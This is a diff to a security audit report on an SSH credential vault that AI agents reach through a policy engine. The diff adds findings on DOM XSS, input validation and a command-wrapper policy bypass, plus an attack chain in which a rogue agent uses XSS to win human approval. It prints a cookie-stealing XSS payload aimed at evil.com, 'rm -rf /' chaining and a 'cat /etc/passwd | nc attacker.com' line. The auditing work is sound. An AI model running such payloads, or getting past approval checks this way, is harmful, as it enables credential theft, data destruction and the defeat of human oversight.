@@ -18,11 +18,11 @@ The audit identified **critical architectural flaws** that fundamentally undermi
 | Severity | Count |
 |----------|-------|
 | CRITICAL | 3 |
-| HIGH | 10 |
-| MEDIUM | 18 |
-| LOW | 5 |
+| HIGH | 12 |
+| MEDIUM | 20 |
+| LOW | 6 |
 | INFORMATIONAL | 4 |
-| **TOTAL** | **40** |
+| **TOTAL** | **45** |
 
 ---
 
@@ -259,7 +259,46 @@ const policyResult = this.policyEngine.checkCommand(
 
 ---
 
-### HIGH-09: SSH Command Injection via Unvalidated Input
+### HIGH-09: DOM-Based XSS via Challenge Data in Approval Page
+
+**File:** `web/auth.html:284-293`
+**Domain:** Injection, Client-Side
+
+**Description:**
+The `displayChallengeInfo()` function renders challenge data from the server API directly into the DOM using `innerHTML` without HTML escaping. The `info.host`, `info.commands`, and `info.agent` values are injected as raw HTML.
+
+**Vulnerable Code:**
+```javascript
+let html = `<div class="host">Host: ${info.host}</div>`;
+if (info.commands && info.commands.length > 0) {
+  html += '<div class="command">' + info.commands.join('<br>') + '</div>';
+}
+actionDetail.innerHTML = html;
+```
+
+**Attack Scenario:**
+1. Attacker (as agent) calls `execute_command` with `command` set to `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
+2. Policy engine denies the command, creating an approval challenge storing the malicious string
+3. Vault owner opens the approval URL, XSS payload executes in their browser
+4. Attacker steals session tokens or tricks user into approving malicious actions
+
+**Fix:** Use `textContent` instead of `innerHTML`, or implement `escapeHtml()` on all interpolated values.
+
+---
+
+### HIGH-10: DOM-Based XSS via Stored Vault Data in Management UI
+
+**File:** `web/manage.html:543-578`
+**Domain:** Injection, Client-Side
+
+**Description:**
+Multiple rendering functions (`renderHosts`, `renderAgents`, `renderSessions`) build HTML via string interpolation from vault data and inject via `innerHTML`. Host names, hostnames, usernames, tags, agent names, fingerprints, and allowed hosts/commands are all rendered unescaped. Additionally, `onclick="deleteHost('${h.id}')"` is vulnerable to attribute injection if `id` contains single quotes.
+
+**Fix:** Escape all user-controlled values; use `data-*` attributes with event listeners instead of inline handlers.
+
+---
+
+### HIGH-11: SSH Command Injection via Unvalidated Input
 
 **File:** `src/ssh/executor.ts`
 **Domain:** Injection
@@ -277,7 +316,7 @@ Commands passed to the SSH executor are forwarded directly to the remote SSH ser
 
 ---
 
-### HIGH-10: Policy Dangerous Pattern Detection Easily Bypassed
+### HIGH-12: Policy Dangerous Pattern Detection Easily Bypassed
 
 **File:** `src/policy/engine.ts`
 **Domain:** Authorization, Injection
@@ -480,6 +519,26 @@ Decrypted vault data (including SSH private keys and passwords) remains in memor
 
 ---
 
+### MEDIUM-19: Missing Input Validation on Host/Agent Management APIs
+
+**File:** `src/web/server.ts:457-549`
+
+The `/api/manage/hosts` and `/api/manage/agents` endpoints accept arbitrary input without validating field types, lengths, or formats. No validation that `hostname` is valid, `port` is 1-65535, or that credential format is expected. Enables SSH host injection (connecting to attacker-controlled servers) and DoS via oversized payloads.
+
+**Fix:** Add Zod schema validation for all management API inputs.
+
+---
+
+### MEDIUM-20: DOM XSS via Unlock Code Injection
+
+**File:** `web/auth.html:451-465`
+
+The `showUnlockCode()` function injects server-provided unlock code directly into `innerHTML`. While the code is generated from a constrained charset server-side, the client trusts the response entirely. An MITM or compromised server could exploit this.
+
+**Fix:** Use `textContent` instead of `innerHTML` for the unlock code display.
+
+---
+
 ## LOW Findings
 
 ### LOW-01: Modulo Bias in Unlock Code Generation
@@ -529,6 +588,16 @@ If `fs.rename()` fails, the `.tmp` file persists on disk with world-readable per
 Error messages returned to clients include raw error strings that may reveal internal paths, stack traces, or configuration details.
 
 **Fix:** Return generic error messages to clients; log details server-side only.
+
+---
+
+### LOW-06: Policy Bypass via Command Wrapper Evasion
+
+**File:** `src/policy/engine.ts:111-131`
+
+The `extractBaseCommand()` function skips known wrappers (`sudo`, `env`, `nohup`, etc.) but can be bypassed with path-prefixed commands (`/usr/bin/rm`), unlisted wrappers (`bash -c "..."` ), semicollon chaining (`ls ; rm -rf /`), and pipe chaining (`cat /etc/passwd | nc attacker.com 4444`). The base command extraction returns `ls` or `cat` which passes the allowlist, while the destructive chained portion executes.
+
+**Fix:** Reject commands containing shell metacharacters; resolve absolute paths before matching; consider full command analysis.
 
 ---
 
@@ -607,16 +676,28 @@ HIGH-03 (Weak unlock codes) + HIGH-04 (No agent binding) + MEDIUM-01 (Timing att
 ### Chain 4: Piggybacking on Another Agent's Session
 
 ```
-HIGH-08 (No session required) + HIGH-09 (Command injection)
+HIGH-08 (No session required) + HIGH-11 (Command injection)
 ```
 
 1. Legitimate Agent A unlocks the vault
 2. Agent B (registered, no session) calls `execute_command`
 3. Vault is unlocked so command executes
-4. Agent B injects shell commands bypassing policy (HIGH-10)
+4. Agent B injects shell commands bypassing policy (HIGH-12)
 5. **Result: Arbitrary command execution on SSH targets**
 
-### Chain 5: Persistent Access via Replay
+### Chain 5: Social Engineering via XSS in Approval Page
+
+```
+HIGH-09 (XSS in auth.html) + HIGH-10 (XSS in manage.html) + MEDIUM-08 (Bound to 0.0.0.0)
+```
+
+1. Attacker agent submits command containing XSS payload (e.g., `<img src=x onerror="...">`)
+2. Policy engine denies, creates approval challenge with malicious command string
+3. Vault owner opens approval URL, XSS executes in their browser
+4. Payload auto-clicks "Approve" button or steals management session token
+5. **Result: Unauthorized command approval or management session takeover**
+
+### Chain 6: Persistent Access via Replay
 
 ```
 HIGH-01 (Nonce cleanup) + MEDIUM-13 (State lost on restart)
@@ -649,8 +730,10 @@ HIGH-01 (Nonce cleanup) + MEDIUM-13 (State lost on restart)
 | HIGH-02 | Persist WebAuthn authenticator counter | Low |
 | HIGH-04 | Bind unlock codes to requesting agent | Low |
 | HIGH-05 | Validate vault path in configuration | Low |
-| HIGH-09 | Sanitize SSH commands; block shell metacharacters | Medium |
-| HIGH-10 | Strengthen policy engine with allowlist approach | High |
+| HIGH-09 | Fix DOM XSS in approval page (escapeHtml) | Low |
+| HIGH-10 | Fix DOM XSS in management UI (escapeHtml) | Low |
+| HIGH-11 | Sanitize SSH commands; block shell metacharacters | Medium |
+| HIGH-12 | Strengthen policy engine with allowlist approach | High |
 | MEDIUM-08 | Default bind to 127.0.0.1 | Low |
 | MEDIUM-14 | Add security headers (helmet) | Low |
 | MEDIUM-15 | Add rate limiting on auth endpoints | Low |
@@ -674,12 +757,14 @@ HIGH-01 (Nonce cleanup) + MEDIUM-13 (State lost on restart)
 | MEDIUM-13 | Persist nonces or reject pre-restart timestamps | Medium |
 | MEDIUM-16 | Validate CORS origin configuration | Low |
 | MEDIUM-18 | Minimize credential time in memory | Medium |
+| MEDIUM-19 | Add Zod validation to management API inputs | Low |
+| MEDIUM-20 | Fix unlock code DOM XSS (use textContent) | Low |
 
 ### Low Priority (P3) - Within 90 days
 
 | ID | Finding | Effort |
 |----|---------|--------|
-| LOW-01 to LOW-05 | Various low-severity hardening | Low each |
+| LOW-01 to LOW-06 | Various low-severity hardening | Low each |
 | INFO-01 to INFO-04 | Informational improvements | Low each |
 
 ---
